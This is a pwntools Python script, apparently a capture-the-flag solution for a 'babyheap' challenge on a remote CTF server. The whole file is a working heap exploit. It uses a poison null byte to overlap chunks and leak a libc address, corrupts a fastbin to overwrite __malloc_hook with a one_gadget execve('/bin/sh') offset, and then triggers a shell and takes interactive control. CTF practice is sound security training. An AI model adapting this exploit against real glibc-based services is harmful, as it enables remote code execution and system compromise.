from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./babyheap"
bin = ELF(file)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

#conn = process(file, env=env)
conn = remote("babyheap.2018.teamrois.cn", 3154)
#gdb.attach(conn)

def menu(ch):
    conn.recvuntil("choice:")
    conn.sendline(str(ch))

def alloc(size, content, shell=False):
    menu(1)
    conn.recvuntil("size")
    conn.sendline(str(size))
    if shell:
        return
    conn.recvuntil("content")
    conn.send(content)

def show(idx):
    menu(2)
    conn.recvuntil("index")
    conn.sendline(str(idx))

def delete(idx):
    menu(3)
    conn.recvuntil("index")
    conn.sendline(str(idx))

# Poison null byte - Leak libc
alloc(0x58, "a\n") # 0
payload = "\x00"*0xf0 + p64(0x100)
alloc(0x100, payload + "\n") # 1
alloc(0x90, "a\n") # 2
alloc(0x100, "a\n") # 3
delete(1)
delete(0)
alloc(0x58, "a"*0x58) # 0
alloc(0x40, "a\n") # 1
alloc(0x90, "b\n") # 4
delete(1)
delete(3)
delete(2)

# Sacred chunk in 4
alloc(0x40, "a\n") # 1
alloc(0xb0, "a\n") # 2 = 4 actually
alloc(0xb0, "a\n") # 3
delete(2)
show(4)
conn.recvuntil("content: ")
libc_leak = u64(conn.recvn(6) + "\x00\x00")
#libc.address = libc_leak - 0x7f214103cb78 + 0x7f2140c78000
libc.address = libc_leak - 0x7f37bcd2ab78 + 0x7f37bc966000
log.info("Libc leak: " + hex(libc_leak))
delete(1)
delete(3)

# Same situation, fastbin corruption
alloc(0x40, "a\n") # 1
alloc(0x60, "a\n") # 2 - 4
alloc(0x60, "a\n") # 3
delete(2)
delete(3)
delete(4)

alloc(0x60, p64(libc.symbols['__malloc_hook'] - 0x23) + "\n") # 2
alloc(0x60, "a\n") # 3
alloc(0x60, "a\n") # 4

"""
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xcd0f3 execve("/bin/sh", rcx, r12)
constraints:
  [rcx] == NULL || rcx == NULL
  [r12] == NULL || r12 == NULL

0xcd1c8 execve("/bin/sh", rax, r12)
constraints:
  [rax] == NULL || rax == NULL
  [r12] == NULL || r12 == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL
"""

alloc(0x60, "\x00"*0x13 + p64(libc.address + 0x4526a) + "\n")

alloc(10, "a", shell=True)

conn.interactive()
